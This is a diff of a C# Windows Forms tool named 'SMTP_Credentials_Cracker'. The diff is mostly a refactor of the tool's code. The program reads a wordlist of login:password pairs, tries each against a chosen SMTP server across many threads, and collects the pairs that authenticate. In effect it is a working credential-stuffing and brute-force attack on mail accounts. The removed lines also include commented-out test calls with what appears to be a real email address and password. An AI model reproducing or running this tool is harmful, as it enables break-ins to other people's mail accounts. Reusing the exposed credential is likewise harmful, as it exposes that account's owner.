@@ -1,29 +1,22 @@
 ﻿using MailKit.Net.Imap;
-using MailKit.Net.Smtp;
 using MailKit.Security;
 using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Net;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace SMTP_Credentials_Cracker
 {
-    public partial class Form1 : Form
+    public partial class Main : Form
     {
-        private List<string> mHits = new List<string>();
-        private string mWordlistPath, mHost;
-        private int mThreadCounter = 0, mPort,  mCurrentLine = 0, mFailedCounter = 0, mHitsCounter = 0;
-        private long mLinesCount;
+        private readonly List<string> _hits = new();
+        private string _wordlistPath, _host;
+        private int _port,  _currentLine, _failedCounter, _hitsCounter;
+        private long _linesCount;
 
-        public Form1()
+        public Main()
         {
             InitializeComponent(); 
             textBox1.AutoSize = false;
@@ -38,12 +31,12 @@ namespace SMTP_Credentials_Cracker
                 smtp.Timeout = 250;
                 smtp.Connect(server, port, SecureSocketOptions.SslOnConnect);
                 smtp.Authenticate(login, password);
-                bool result = smtp.IsAuthenticated;
+                var result = smtp.IsAuthenticated;
                 smtp.Disconnect(true);
                 return result;
             }
 
-            catch(Exception timeoutException)
+            catch(Exception)
             {
                 return false;
             }
@@ -53,31 +46,26 @@ namespace SMTP_Credentials_Cracker
 
         private void button1_Click(object sender, EventArgs e)
         {
-            //TryAuthenticate2("milosz.skiba@wp.pl", "@Kaisal1312@", "smtp.wp.pl", 465);
-            //bool b = TryAuthenticate("milosz.skiba@wp.pl", "@Kaisal1312@", "imap.wp.pl", 993);
             
         }
 
         private void button1_Click_1(object sender, EventArgs e)
         {
-            mHost = textBoxHost.Text;
-            mPort = Convert.ToInt32(textBoxPort.Text);
-            int maxThreads = Convert.ToInt32(textBoxThreads.Text);
+            _host = textBoxHost.Text;
+            _port = Convert.ToInt32(textBoxPort.Text);
+            var maxThreads = Convert.ToInt32(textBoxThreads.Text);
 
-            new Thread(() => ProgressWatcher()).Start();
+            new Thread(ProgressWatcher).Start();
 
-            
             ThreadPool.SetMaxThreads(maxThreads, maxThreads);
 
-            using (StreamReader reader = new StreamReader(mWordlistPath))
-            {
-                string line;
+            using var reader = new StreamReader(_wordlistPath);
 
-                while ((line = reader.ReadLine()) != null)
-                {
-                    ThreadPool.QueueUserWorkItem(new WaitCallback(ProcessLine), line.Split(':'));
-                    Thread.Sleep(100);
-                }
+            string line;
+            while ((line = reader.ReadLine()) != null)
+            {
+                ThreadPool.QueueUserWorkItem(ProcessLine, line.Split(':'));
+                Thread.Sleep(100);
             }
         }
 
@@ -88,27 +76,27 @@ namespace SMTP_Credentials_Cracker
 
         private void ProcessLine(object line)
         {
-            string[] _line = (string[])line;
+            var _line = (string[])line;
 
-            if (TryAuthenticate(_line[0], _line[1], mHost, mPort))
+            if (TryAuthenticate(_line[0], _line[1], _host, _port))
             {
-                mHits.Add($"{_line[0]}:{_line[1]}");
-                mHitsCounter++;
+                _hits.Add($"{_line[0]}:{_line[1]}");
+                _hitsCounter++;
             }
             else
-                mFailedCounter++;
+                _failedCounter++;
 
-            mCurrentLine++;
+            _currentLine++;
         }
 
         private void ProgressWatcher()
         {
-            while(mCurrentLine < mLinesCount)
+            while(_currentLine < _linesCount)
             {
                 //Thread thisThread = Thread.CurrentThread;
 
                 progressLabel.Invoke((MethodInvoker) delegate {
-                    progressLabel.Text = $"Progress {mCurrentLine} of {mLinesCount}";
+                    progressLabel.Text = $@"Progress {_currentLine} of {_linesCount}";
                 });
 
                 textBoxWorkingThreads.Invoke((MethodInvoker)delegate {
@@ -120,11 +108,11 @@ namespace SMTP_Credentials_Cracker
                 });
 
                 textBoxSuccess.Invoke((MethodInvoker)delegate {
-                    textBoxSuccess.Text = mHitsCounter.ToString();
+                    textBoxSuccess.Text = _hitsCounter.ToString();
                 });
                 
                 textBoxSuccess.Invoke((MethodInvoker)delegate {
-                    textBoxFailed.Text = mFailedCounter.ToString();
+                    textBoxFailed.Text = _failedCounter.ToString();
                 });
 
                 Thread.Sleep(100);
@@ -134,30 +122,29 @@ namespace SMTP_Credentials_Cracker
         private void button2_Click(object sender, EventArgs e)
         {
             OpenFileDialog openFileDialog = new OpenFileDialog();
-            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
+            openFileDialog.Filter = @"Text files (*.txt)|*.txt|All files (*.*)|*.*";
 
             if (openFileDialog.ShowDialog() == DialogResult.OK)
             {
-                mWordlistPath = openFileDialog.FileName;
-                textBox1.Text = mWordlistPath;
-                mLinesCount = CountLines();
-                progressLabel.Text = $"Progress {mCurrentLine} of {mLinesCount}";
-                progressBar1.Maximum = (int)mLinesCount;
+                _wordlistPath = openFileDialog.FileName;
+                textBox1.Text = _wordlistPath;
+                _linesCount = CountLines();
+                progressLabel.Text = $@"Progress {_currentLine} of {_linesCount}";
+                progressBar1.Maximum = (int)_linesCount;
             }
         }
 
         private long CountLines()
         {
-            FileStream fs = new FileStream(mWordlistPath, FileMode.Open, FileAccess.Read, FileShare.None, 1024 * 1024);
-
+            var fs = new FileStream(_wordlistPath, FileMode.Open, FileAccess.Read, FileShare.None, 1024 * 1024);
             long lineCount = 0;
-            byte[] buffer = new byte[1024 * 1024];
+            var buffer = new byte[1024 * 1024];
             int bytesRead;
 
             do
             {
                 bytesRead = fs.Read(buffer, 0, buffer.Length);
-                for (int i = 0; i < bytesRead; i++)
+                for (var i = 0; i < bytesRead; i++)
                     if (buffer[i] == '\n')
                         lineCount++;
             }
